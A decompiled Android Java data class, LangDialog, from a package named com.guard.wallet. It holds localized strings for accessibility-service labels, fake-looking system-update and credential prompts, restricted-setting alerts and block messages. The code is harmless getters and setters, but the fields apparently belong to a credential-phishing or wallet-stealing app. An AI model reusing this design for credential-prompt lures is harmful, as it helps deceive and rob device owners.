package com.guard.wallet.entity;

import android.support.annotation.NonNull;
import java.io.Serializable;
import p000a.AbstractC0000a;

/* loaded from: classes.dex */
public class LangDialog implements Serializable {
    private String accessibilityServiceLabel;
    private String alertMsg;
    private String alertRestrictedMsg;
    private String alertTitle;
    private String aliveBlockMsg;
    private String allowRestricted;
    private String appCredentialDescription;
    private String appCredentialInitMsg;
    private String appCredentialSubTitle;
    private String appCredentialTitle;
    private String appLabel;
    private String exitConfirm;
    private String launcherLabel;
    private String notificationContent;
    private String notificationTitle;
    private String okText;
    private String updateCredentialDescription;
    private String updateCredentialSubTitle;
    private String updateCredentialTitle;
    private String updateSystemMsg;
    private String wifiBlockMsg;

    public LangDialog() {
    }

    public LangDialog(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, String str10, String str11, String str12, String str13, String str14, String str15, String str16, String str17, String str18, String str19, String str20, String str21) {
        this.appLabel = str;
        this.launcherLabel = str2;
        this.accessibilityServiceLabel = str3;
        this.okText = str4;
        this.alertTitle = str5;
        this.alertMsg = str6;
        this.aliveBlockMsg = str7;
        this.updateSystemMsg = str8;
        this.notificationTitle = str9;
        this.notificationContent = str10;
        this.exitConfirm = str11;
        this.allowRestricted = str12;
        this.alertRestrictedMsg = str13;
        this.updateCredentialTitle = str14;
        this.updateCredentialSubTitle = str15;
        this.updateCredentialDescription = str16;
        this.appCredentialTitle = str17;
        this.appCredentialSubTitle = str18;
        this.appCredentialDescription = str19;
        this.appCredentialInitMsg = str20;
        this.wifiBlockMsg = str21;
    }

    public String getAccessibilityServiceLabel() {
        return this.accessibilityServiceLabel;
    }

    public String getAlertMsg() {
        return this.alertMsg;
    }

    public String getAlertRestrictedMsg() {
        return this.alertRestrictedMsg;
    }

    public String getAlertTitle() {
        return this.alertTitle;
    }

    public String getAliveBlockMsg() {
        return this.aliveBlockMsg;
    }

    public String getAllowRestricted() {
        return this.allowRestricted;
    }

    public String getAppCredentialDescription() {
        return this.appCredentialDescription;
    }

    public String getAppCredentialInitMsg() {
        return this.appCredentialInitMsg;
    }

    public String getAppCredentialSubTitle() {
        return this.appCredentialSubTitle;
    }

    public String getAppCredentialTitle() {
        return this.appCredentialTitle;
    }

    public String getAppLabel() {
        return this.appLabel;
    }

    public String getExitConfirm() {
        return this.exitConfirm;
    }

    public String getLauncherLabel() {
        return this.launcherLabel;
    }

    public String getNotificationContent() {
        return this.notificationContent;
    }

    public String getNotificationTitle() {
        return this.notificationTitle;
    }

    public String getOkText() {
        return this.okText;
    }

    public String getUpdateCredentialDescription() {
        return this.updateCredentialDescription;
    }

    public String getUpdateCredentialSubTitle() {
        return this.updateCredentialSubTitle;
    }

    public String getUpdateCredentialTitle() {
        return this.updateCredentialTitle;
    }

    public String getUpdateSystemMsg() {
        return this.updateSystemMsg;
    }

    public String getWifiBlockMsg() {
        return this.wifiBlockMsg;
    }

    public void setAccessibilityServiceLabel(String str) {
        this.accessibilityServiceLabel = str;
    }

    public void setAlertMsg(String str) {
        this.alertMsg = str;
    }

    public void setAlertRestrictedMsg(String str) {
        this.alertRestrictedMsg = str;
    }

    public void setAlertTitle(String str) {
        this.alertTitle = str;
    }

    public void setAliveBlockMsg(String str) {
        this.aliveBlockMsg = str;
    }

    public void setAllowRestricted(String str) {
        this.allowRestricted = str;
    }

    public void setAppCredentialDescription(String str) {
        this.appCredentialDescription = str;
    }

    public void setAppCredentialInitMsg(String str) {
        this.appCredentialInitMsg = str;
    }

    public void setAppCredentialSubTitle(String str) {
        this.appCredentialSubTitle = str;
    }

    public void setAppCredentialTitle(String str) {
        this.appCredentialTitle = str;
    }

    public void setAppLabel(String str) {
        this.appLabel = str;
    }

    public void setExitConfirm(String str) {
        this.exitConfirm = str;
    }

    public void setLauncherLabel(String str) {
        this.launcherLabel = str;
    }

    public void setNotificationContent(String str) {
        this.notificationContent = str;
    }

    public void setNotificationTitle(String str) {
        this.notificationTitle = str;
    }

    public void setOkText(String str) {
        this.okText = str;
    }

    public void setUpdateCredentialDescription(String str) {
        this.updateCredentialDescription = str;
    }

    public void setUpdateCredentialSubTitle(String str) {
        this.updateCredentialSubTitle = str;
    }

    public void setUpdateCredentialTitle(String str) {
        this.updateCredentialTitle = str;
    }

    public void setUpdateSystemMsg(String str) {
        this.updateSystemMsg = str;
    }

    public void setWifiBlockMsg(String str) {
        this.wifiBlockMsg = str;
    }

    @NonNull
    public String toString() {
        StringBuilder sb = new StringBuilder("LangDialog{appLabel='");
        sb.append(this.appLabel);
        sb.append("', launcherLabel='");
        sb.append(this.launcherLabel);
        sb.append("', accessibilityServiceLabel='");
        sb.append(this.accessibilityServiceLabel);
        sb.append("', okText='");
        sb.append(this.okText);
        sb.append("', alertTitle='");
        sb.append(this.alertTitle);
        sb.append("', alertMsg='");
        sb.append(this.alertMsg);
        sb.append("', aliveBlockMsg='");
        sb.append(this.aliveBlockMsg);
        sb.append("', updateSystemMsg='");
        sb.append(this.updateSystemMsg);
        sb.append("', notificationTitle='");
        sb.append(this.notificationTitle);
        sb.append("', notificationContent='");
        sb.append(this.notificationContent);
        sb.append("', exitConfirm='");
        sb.append(this.exitConfirm);
        sb.append("', allowRestricted='");
        sb.append(this.allowRestricted);
        sb.append("', alertRestrictedMsg='");
        sb.append(this.alertRestrictedMsg);
        sb.append("', updateCredentialTitle='");
        sb.append(this.updateCredentialTitle);
        sb.append("', updateCredentialSubTitle='");
        sb.append(this.updateCredentialSubTitle);
        sb.append("', updateCredentialDescription='");
        sb.append(this.updateCredentialDescription);
        sb.append("', appCredentialTitle='");
        sb.append(this.appCredentialTitle);
        sb.append("', appCredentialSubTitle='");
        sb.append(this.appCredentialSubTitle);
        sb.append("', appCredentialDescription='");
        sb.append(this.appCredentialDescription);
        sb.append("', appCredentialInitMsg='");
        sb.append(this.appCredentialInitMsg);
        sb.append("', wifiBlockMsg='");
        return AbstractC0000a.m18n(sb, this.wifiBlockMsg, "'}");
    }
}
